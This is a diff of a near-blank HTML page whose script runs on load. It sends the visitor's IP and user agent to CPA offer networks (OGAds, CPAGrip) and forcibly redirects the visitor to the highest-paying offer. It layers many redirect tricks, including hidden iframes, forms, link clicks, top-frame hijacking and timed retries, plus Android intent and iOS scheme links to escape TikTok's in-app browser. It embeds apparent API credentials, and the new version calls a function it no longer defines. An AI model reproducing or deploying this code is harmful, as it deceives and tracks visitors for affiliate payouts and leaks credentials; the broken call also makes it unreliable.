@@ -1,142 +1,204 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>...</title>
   <meta name="referrer" content="origin">
   <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
   <link rel="canonical" href="#">
+  <style>html,body{height:100%;margin:0}body{display:flex;align-items:center;justify-content:center;font-family:Arial,Helvetica,sans-serif}</style>
 </head>
 <body>
-  <div style="text-align:center; margin-top: 40vh; font-family: Arial, sans-serif; font-size: 20px;">
-    …
-  </div>
+  <div style="font-size:20px">...</div>
 
-  <script>
-    function getEnv() {
-      const ua = navigator.userAgent.toLowerCase();
-      return {
-        isAndroid: ua.includes("android"),
-        isIOS: /iphone|ipad|ipod/.test(ua),
-        isTikTok: /(tiktok|tiktok_lite|tiktoklite|musical_ly|douyin)/.test(ua)
-      };
-    }
+<script>
+function getEnv(){
+  const ua = navigator.userAgent || "";
+  const l = ua.toLowerCase();
+  return {
+    ua,
+    isAndroid: l.includes("android"),
+    isIOS: /iphone|ipad|ipod/.test(l),
+    isTikTok: /(tiktok|tiktok_lite|tiktoklite|musical_ly|douyin)/i.test(ua),
+    isTikTokLite: /(tiktok_lite|tiktoklite)/i.test(ua)
+  };
+}
 
-    function attemptRedirect(url) {
-      try { window.location.href = url; } catch {}
-      try { window.location.replace(url); } catch {}
-      try { window.open(url, "_blank"); } catch {}
-      const iframe = document.createElement("iframe");
-      iframe.style.display = "none";
-      iframe.src = url;
-      document.body.appendChild(iframe);
-    }
+function safeOpen(url){
+  try { window.location.href = url; } catch(e){}
+  try { window.location.assign(url); } catch(e){}
+  try { window.location.replace(url); } catch(e){}
+  try { window.open(url, "_blank"); } catch(e){}
+  try { window.open(url, "_top"); } catch(e){}
+  try {
+    const a = document.createElement("a");
+    a.href = url;
+    a.target = "_top";
+    a.rel = "noreferrer noopener";
+    a.style.display = "none";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+  } catch(e){}
+  try {
+    const f = document.createElement("form");
+    f.style.display = "none";
+    f.action = url;
+    f.method = "GET";
+    f.target = "_top";
+    document.body.appendChild(f);
+    f.submit();
+    f.remove();
+  } catch(e){}
+  try {
+    const ifr = document.createElement("iframe");
+    ifr.style.display = "none";
+    ifr.src = url;
+    document.body.appendChild(ifr);
+  } catch(e){}
+  // last-ditch: set top if available
+  try { if (top && top !== self) top.location.href = url; } catch(e){}
+}
 
-    async function fetchOgadsMax() {
-      const apiKey = "34829|nJfCK9PNtqv8s0cqEl943LhDfd3ufQMGcNc2ZdCT429ec4af";
+async function fetchJsonWithTimeout(url, opts = {}, timeout = 5000){
+  const controller = new AbortController();
+  const id = setTimeout(()=>controller.abort(), timeout);
+  try {
+    const res = await fetch(url, {...opts, signal: controller.signal});
+    clearTimeout(id);
+    return res;
+  } catch(e){
+    clearTimeout(id);
+    throw e;
+  }
+}
+
+async function fetchOgadsMax(){
+  const API_KEY = "34829|nJfCK9PNtqv8s0cqEl943LhDfd3ufQMGcNc2ZdCT429ec4af";
+  try {
+    const ipRes = await fetchJsonWithTimeout("https://api.ipify.org?format=json", {}, 4000).catch(()=>null);
+    const ip = ipRes ? (await ipRes.json()).ip : "";
+    const apiUrl = new URL("https://unlockcontent.net/api/v2");
+    if(ip) apiUrl.searchParams.append("ip", ip);
+    apiUrl.searchParams.append("user_agent", navigator.userAgent || "");
+    apiUrl.searchParams.append("limit", "1000");
+    apiUrl.searchParams.append("ctype", "0");
+
+    const res = await fetchJsonWithTimeout(apiUrl.toString(), { headers: { Authorization: `Bearer ${API_KEY}` } }, 6000);
+    if(!res || !res.ok) throw new Error("OGAds fetch failed");
+    const data = await res.json();
+    const offers = data.offers || [];
+    let best = null;
+    let bestP = -Infinity;
+    for(const o of offers){
       try {
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipRes.json();
-        const apiUrl = new URL("https://unlockcontent.net/api/v2");
-        apiUrl.searchParams.append("ip", ipData.ip);
-        apiUrl.searchParams.append("user_agent", navigator.userAgent);
-        apiUrl.searchParams.append("limit", "1000");
-        apiUrl.searchParams.append("ctype", "0");
-
-        const res = await fetch(apiUrl, { headers: { Authorization: `Bearer ${apiKey}` } });
-        if (!res.ok) throw new Error("OGAds fetch failed");
-        const data = await res.json();
-        const offers = data.offers || [];
-        let maxOffer = null;
-        let maxPayout = -1;
-
-        offers.forEach(o => {
-          const payout = parseFloat(o.payout) || 0;
-          if (payout > maxPayout) {
-            maxPayout = payout;
-            maxOffer = {
-              url: o.link || o.click_url || o.offer_url || o.url,
-              payout: payout
-            };
-          }
-        });
-        return maxOffer;
-      } catch (err) {
-        console.error("OGAds error:", err);
-        return null;
-      }
-    }
-
-    async function fetchCpagripMax() {
-      const url = "https://www.cpagrip.com/common/offer_feed_json.php?user_id=2439739&pubkey=23311a81282b777eab88a6d19f0d9493&tracking_id=";
-      try {
-        const res = await fetch(url);
-        const data = await res.json();
-        const offers = data.offers || data;
-        let maxOffer = null;
-        let maxPayout = -1;
-
-        if (offers && offers.length) {
-          offers.forEach(o => {
-            const payout = parseFloat(o.default_payout) || 0;
-            if (payout > maxPayout) {
-              maxPayout = payout;
-              maxOffer = {
-                url: o.offerlink || o.offer_url,
-                payout: payout
-              };
-            }
-          });
+        const payout = parseFloat(o.payout);
+        if(!isFinite(payout)) continue;
+        const url = (o.link || o.click_url || o.offer_url || o.url || "").toString().trim();
+        if(!url) continue;
+        if(payout > bestP){
+          bestP = payout;
+          best = { url, payout };
         }
-        return maxOffer;
-      } catch (err) {
-        console.error("CPA Grip error:", err);
-        return null;
-      }
+      } catch(e){}
     }
+    return best;
+  } catch(e){
+    return null;
+  }
+}
 
-    async function getBestOfferUrl() {
-      const [ogadsOffer, cpaOffer] = await Promise.all([fetchOgadsMax(), fetchCpagripMax()]);
-      if (!ogadsOffer && !cpaOffer) {
-        return null; // no fallback
-      }
-      if (!ogadsOffer) return cpaOffer.url;
-      if (!cpaOffer) return ogadsOffer.url;
-      return ogadsOffer.payout >= cpaOffer.payout ? ogadsOffer.url : cpaOffer.url;
+async function fetchCpagripMax(){
+  const FEED = "https://www.cpagrip.com/common/offer_feed_json.php?user_id=2439739&pubkey=23311a81282b777eab88a6d19f0d9493&tracking_id=";
+  try {
+    const res = await fetchJsonWithTimeout(FEED, {}, 6000);
+    if(!res || !res.ok) throw new Error("CPA fetch failed");
+    const data = await res.json();
+    const offers = data.offers || data || [];
+    let best = null;
+    let bestP = -Infinity;
+    for(const o of offers){
+      try {
+        const payout = parseFloat(o.default_payout);
+        if(!isFinite(payout)) continue;
+        const url = (o.offerlink || o.offer_url || "").toString().trim();
+        if(!url) continue;
+        if(payout > bestP){
+          bestP = payout;
+          best = { url, payout };
+        }
+      } catch(e){}
     }
+    return best;
+  } catch(e){
+    return null;
+  }
+}
 
-    async function redirectTikTok() {
-      const targetUrl = await getBestOfferUrl();
-      if (!targetUrl) return; // stop if no offers
+async function getBestOfferUrl(){
+  const [og, cpa] = await Promise.allSettled([fetchOgadsMax(), fetchCpagripMax()]);
+  const ogv = og.status === "fulfilled" ? og.value : null;
+  const cpav = cpa.status === "fulfilled" ? cpa.value : null;
+  if(!ogv && !cpav) return null;
+  if(!ogv) return cpav.url;
+  if(!cpav) return ogv.url;
+  return (ogv.payout >= cpav.payout) ? ogv.url : cpav.url;
+}
 
-      const env = getEnv();
-      if (!env.isTikTok) {
-        attemptRedirect(targetUrl);
-        return;
+async function escapeAndRedirect(){
+  const env = getEnv();
+  let target = null;
+  try {
+    target = await getBestOfferUrl();
+  } catch(e){}
+  if(!target) return;
+
+  if(!env.isTikTok){
+    safeOpen(target);
+    return;
+  }
+  if(env.isAndroid){
+    try {
+      const stripped = target.replace(/^https?:\/\//i, "");
+      const intentVariants = [
+        `intent://${encodeURI(stripped)}#Intent;scheme=https;package=com.android.chrome;end`,
+        `intent://${encodeURI(stripped)}#Intent;scheme=http;package=com.android.chrome;end`,
+        `intent://${encodeURI(stripped)}#Intent;scheme=https;package=com.google.android.webview;end`,
+        `intent://${encodeURI(stripped)}#Intent;scheme=https;end`
+      ];
+      for(const u of intentVariants){
+        try { attemptRedirect(u); } catch(e){}
       }
-
-      if (env.isAndroid) {
-        const intents = [
-          `intent://${targetUrl.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`,
-          `intent://${targetUrl.replace("https://", "")}#Intent;scheme=http;package=com.android.chrome;end`,
-          `intent://${targetUrl.replace("https://", "")}#Intent;scheme=https;package=com.google.android.webview;end`,
-          `intent://${targetUrl.replace("https://", "")}#Intent;scheme=https;end`
-        ];
-        intents.forEach(url => attemptRedirect(url));
-      } else if (env.isIOS) {
-        const iosSchemes = [
-          `googlechromes://${targetUrl.replace("https://", "")}`,
-          `safari://${targetUrl.replace("https://", "")}`
-        ];
-        iosSchemes.forEach(url => attemptRedirect(url));
+      try { top.location.href = target; } catch(e){}
+    } catch(e){}
+  } else if(env.isIOS){
+    try {
+      const stripped = target.replace(/^https?:\/\//i, "");
+      const iosVariants = [
+        `googlechromes://${stripped}`,
+        `googlechromes://navigate?url=${encodeURIComponent(target)}`,
+        `safari://${stripped}`
+      ];
+      for(const u of iosVariants){
+        try { attemptRedirect(u); } catch(e){}
       }
+      try { top.location.href = target; } catch(e){}
+    } catch(e){}
+  } else {
+    safeOpen(target);
+  }
 
-      setTimeout(() => attemptRedirect(targetUrl), 2000);
-    }
 
-    setTimeout(redirectTikTok, 100);
-  </script>
+  const attempts = [150, 450, 900, 1500, 2600];
+  for(const t of attempts){
+    setTimeout(()=>{ try { safeOpen(target); } catch(e){} }, t);
+  }
+}
+
+setTimeout(escapeAndRedirect, 120);
+</script>
 </body>
 </html>
+
 
